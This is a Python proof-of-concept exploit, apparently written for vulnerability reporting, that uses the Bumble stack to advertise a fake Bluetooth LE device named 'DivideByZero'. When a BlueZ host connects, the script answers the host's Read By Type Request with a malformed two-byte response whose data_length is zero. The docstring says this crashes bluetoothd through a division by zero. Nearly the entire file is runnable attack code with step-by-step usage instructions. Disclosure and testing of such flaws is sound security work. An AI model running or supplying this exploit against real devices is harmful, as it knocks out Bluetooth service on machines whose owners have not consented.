"""
PoC: Division by Zero in BlueZ GATT Read By Type Response

CVE:  N/A (reporting)
CWE:  CWE-369 (Divide By Zero)
File: src/shared/gatt-helpers.c:1297

Description:
  BlueZ's read_by_type_cb() does not validate that the 'data_length' field
  in a Read By Type Response is non-zero before using it in a modulo operation:
    ((length - 1) % data_length)
  A malicious GATT server responding with data_length=0 causes SIGFPE → crash.

How to use:
  1. Run this script on a machine with Bumble + a BT controller:
     sudo python3 gatt_divide_by_zero_poc.py hci-socket:<hci_dev>
     Example: sudo python3 gatt_divide_by_zero_poc.py hci-socket:0
  
  2. On the target machine running BlueZ, connect to the device advertised
     as "DivideByZero". BlueZ will automatically perform service discovery
     (Read By Type Request), and the malicious response will crash bluetoothd.

How it works:
  - Bumble advertises a minimal GATT service
  - BlueZ connects and sends Read By Type Request to discover services
  - This script intercepts the request and sends back a malformed response
    with data_length=0 → division by zero → BlueZ crashes (SIGFPE)
"""

import asyncio
import logging
import struct
import sys

from bumble.device import Device
from bumble.transport import open_transport
from bumble.core import AdvertisingData, UUID
from bumble.hci import HCI_Constant

# ── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# GATT/ATT Constants
# ═══════════════════════════════════════════════════════════════════════════
BT_ATT_OP_READ_BY_TYPE_REQ = 0x08
BT_ATT_OP_READ_BY_TYPE_RSP = 0x09
BT_ATT_OP_ERROR_RSP = 0x01

# Generic Attribute Profile Service (0x1801) — used to trigger Read By Type
UUID_GATT_SERVICE = UUID('00001801-0000-1000-8000-00805F9B34FB')
UUID_SERVICE_CHANGED = UUID('00002A05-0000-1000-8000-00805F9B34FB')


class DivideByZeroGattServer:
    """GATT Server that responds to Read By Type with data_length=0."""

    def __init__(self, device):
        self.device = device
        self.connection = None

    def on_connection(self, connection):
        """Called when BlueZ connects to us."""
        logger.info(f'[+] BlueZ connected: {connection}')
        self.connection = connection

        # Register ATT callback to intercept Read By Type Request
        connection.att_server.on_pdu = self.on_att_pdu

        logger.info('[+] ATT callback registered — waiting for Read By Type Request...')

    def on_att_pdu(self, pdu):
        """Intercept incoming ATT PDUs."""
        if len(pdu) == 0:
            return pdu

        opcode = pdu[0]

        if opcode == BT_ATT_OP_READ_BY_TYPE_REQ:
            logger.info('[>>>] Received Read By Type Request!')

            # Parse the request
            start_handle = struct.unpack_from('<H', pdu, 1)[0]
            end_handle = struct.unpack_from('<H', pdu, 3)[0]
            uuid_type = pdu[5:]

            logger.info(f'      Start Handle: 0x{start_handle:04X}')
            logger.info(f'      End Handle:   0x{end_handle:04X}')
            logger.info(f'      UUID Type:    {uuid_type.hex()}')

            # ── CRAFT MALICIOUS RESPONSE ──────────────────────────────
            # Normal Read By Type Response format:
            #   Opcode(1) | Length(1) | Handle(2) | Value(...)
            #   Length = 2 + len(Value)  (per-attribute length)
            #
            # Malicious: set Length = 0 → data_length = 0
            #   → read_by_type_cb: (length - 1) % 0  → DIVISION BY ZERO
            #
            # We send a response that looks almost valid but has data_length=0.
            # BlueZ will process it and crash on the modulo operation.
            #
            # The PDU must be minimally valid to reach line 1297:
            #   BT_ATT_OP_READ_BY_TYPE_RSP (1 byte) | data_length=0 (1 byte)
            # That's it — 2 bytes total.
            # length will be 2, (2-1) % 0 = 1 % 0 → SIGFPE
            # ───────────────────────────────────────────────────────────
            malformed_rsp = struct.pack('<BB', BT_ATT_OP_READ_BY_TYPE_RSP, 0)

            logger.info(f'[<<<] Sending malicious response: {malformed_rsp.hex()}')
            logger.info(f'      data_length = 0 → division by zero in read_by_type_cb()')
            logger.info(f'      Expected: BlueZ bluetoothd will crash (SIGFPE)')

            # Send the malformed response directly via ATT
            self.connection.att_server.send_pdu(malformed_rsp)

            # Return None to prevent normal handling
            return None

        # For all other PDUs, pass through normally
        return pdu

    def on_disconnection(self, reason):
        """Called when BlueZ disconnects."""
        logger.info(f'[-] BlueZ disconnected: reason={reason}')
        self.connection = None


class AdvertisedDevice(Device):
    """A Bumble device that advertises itself as a GATT server."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.poc = None

    async def start(self):
        """Start advertising and wait for connections."""
        # Set device name
        self.name = 'DivideByZero'

        # Create PoC handler
        self.poc = DivideByZeroGattServer(self)

        # Register connection callback
        self.on('connection', self.poc.on_connection)
        self.on('disconnection', self.poc.on_disconnection)

        # Start advertising as a connectable device
        advertising_data = AdvertisingData([
            (AdvertisingData.FLAGS,
             bytes([AdvertisingData.LE_GENERAL_DISCOVERABLE_MODE |
                    AdvertisingData.BR_EDR_NOT_SUPPORTED])),
            (AdvertisingData.SHORTENED_LOCAL_NAME, b'DivideByZero'),
            (AdvertisingData.INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS,
             bytes([0x01, 0x18])),  # GATT Service (0x1801)
        ])

        scan_response_data = AdvertisingData([
            (AdvertisingData.COMPLETE_LOCAL_NAME, b'DivideByZero'),
        ])

        await self.start_advertising(
            advertising_data=advertising_data,
            scan_response_data=scan_response_data,
            connectable=True
        )

        logger.info('[+] Advertising as "DivideByZero" (connectable)')
        logger.info('[+] Waiting for BlueZ to connect...')

        # Keep running
        while True:
            await asyncio.sleep(3600)


# ═══════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    if len(sys.argv) < 2:
        logger.error('Usage: sudo python3 gatt_divide_by_zero_poc.py <transport>')
        logger.error('  Example: sudo python3 gatt_divide_by_zero_poc.py hci-socket:0')
        logger.error('  Example: sudo python3 gatt_divide_by_zero_poc.py tcp-client:127.0.0.1:1234')
        sys.exit(1)

    transport = sys.argv[1]
    logger.info(f'[+] Opening transport: {transport}')

    async with await open_transport(transport) as (hci_source, hci_sink):
        logger.info('[+] Transport opened')

        device = AdvertisedDevice(
            hci_source=hci_source,
            hci_sink=hci_sink,
            owner_address=b'\xBB\xBB\xBB\xBB\xBB\xBB',
            advertising_type=HCI_Constant.OWN_ADDRESS_TYPE_LE_PUBLIC
        )

        await device.start()


if __name__ == '__main__':
    asyncio.run(main())
